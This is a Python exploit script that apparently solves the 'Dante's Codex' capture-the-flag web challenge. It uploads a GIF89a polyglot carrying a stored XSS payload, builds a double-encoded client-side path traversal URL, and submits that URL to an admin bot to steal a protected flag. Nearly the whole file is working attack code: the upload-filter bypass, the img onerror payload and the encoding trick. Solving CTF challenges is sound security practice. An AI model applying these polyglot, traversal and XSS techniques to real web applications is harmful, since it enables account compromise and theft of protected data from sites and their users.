#!/usr/bin/env python3
"""
Dante's Codex — Exploit Script
Chain: GIF89a polyglot upload → double-decode CSPT → innerHTML XSS → flag via console.log

Usage:
  python3 solve.py <web_url> <bot_host:port>
  python3 solve.py http://localhost:8000 localhost:4000
"""

import sys
import socket
import requests
import re
import time

if len(sys.argv) < 3:
    print(f"Usage: {sys.argv[0]} <web_url> <bot_host:port>")
    sys.exit(1)

WEB_URL  = sys.argv[1].rstrip('/')
BOT      = sys.argv[2]
BOT_HOST, BOT_PORT = BOT.split(':')
BOT_PORT = int(BOT_PORT)

# ── Step 1: Upload GIF polyglot ───────────────────────────────────────────────
xss = (
    "fetch('/api/v1/relic/read/forbidden-tome.txt')"
    ".then(r=>r.json())"
    ".then(d=>console.log(d.flag))"
    ".catch(e=>console.log('err:'+e))"
)

json_body = (
    '{'
    '"id":99,'
    '"circle":9,'
    '"title":"The Frozen Lake",'
    '"author":"Lucifer",'
    '"date":"Anno Inferni IX",'
    f'"content":"<img src=x onerror=\\"{xss}\\">"'
    '}'
)

polyglot = b'GIF89a\x01\x00' + json_body.encode()

print(f"[+] Polyglot size: {len(polyglot)} bytes")
print(f"[+] Uploading to {WEB_URL}/api/v1/relic/upload ...")

r = requests.post(
    f"{WEB_URL}/api/v1/relic/upload",
    files={"relic": ("relic.gif", polyglot, "image/gif")},
    timeout=10,
)

if r.status_code != 200 or r.json().get('error'):
    print(f"[-] Upload failed ({r.status_code}): {r.text}")
    sys.exit(1)

filename = r.json()['filename']
print(f"[+] Uploaded: {filename}")

# ── Step 2: Build double-encoded CSPT URL ─────────────────────────────────────
def double_enc(s):
    result = ''
    for ch in s:
        if ch == '.':   result += '%252e'
        elif ch == '/': result += '%252f'
        else:           result += ch
    return result

traversal_prefix = '../../../v1/relic/json/'
encoded_prefix   = double_enc(traversal_prefix)
encoded_filename = filename.replace('.', '%252e')
encoded          = encoded_prefix + encoded_filename
bot_url          = f"http://dantes-codex-nginx/#/scroll/{encoded}"

print(f"\n[+] CSPT traversal : {traversal_prefix}{filename}")
print(f"[+] Double-encoded : {encoded}")
print(f"[+] Bot URL        : {bot_url}")

# ── Step 3: Send to bot and wait for flag ─────────────────────────────────────
print(f"\n[+] Connecting to bot at {BOT_HOST}:{BOT_PORT} ...")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((BOT_HOST, BOT_PORT))

buf = b''
while b'> ' not in buf:
    buf += s.recv(1024)
print(buf.decode(errors='replace'), end='', flush=True)

s.sendall((bot_url + '\n').encode())
print(f"[+] Sent. Waiting for flag ...\n")

# Keep reading until we get the flag or timeout
# The flag arrives via [PAGE] console.log relay BEFORE the bot closes
output = b''
s.settimeout(1)
deadline = time.time() + 40  # 40 second total wait

while time.time() < deadline:
    try:
        chunk = s.recv(4096)
        if not chunk:
            # Connection closed — wait a moment more for any buffered data
            break
        output += chunk
        print(chunk.decode(errors='replace'), end='', flush=True)
        if b'INFERNOCTF{' in output:
            break
    except socket.timeout:
        if b'abyss' in output:
            # Bot has returned — give it 2 more seconds then stop
            if time.time() > deadline - 35:
                break
        continue

s.close()

flags = re.findall(r'INFERNOCTF\{[^}]+\}', output.decode(errors='replace'))
if flags:
    print(f"\n\n[+] FLAG: {flags[0]}")
else:
    print("\n[-] Flag not captured in socket output")
    print("    Check docker logs — flag may have printed there as [PAGE] INFERNOCTF{...}")
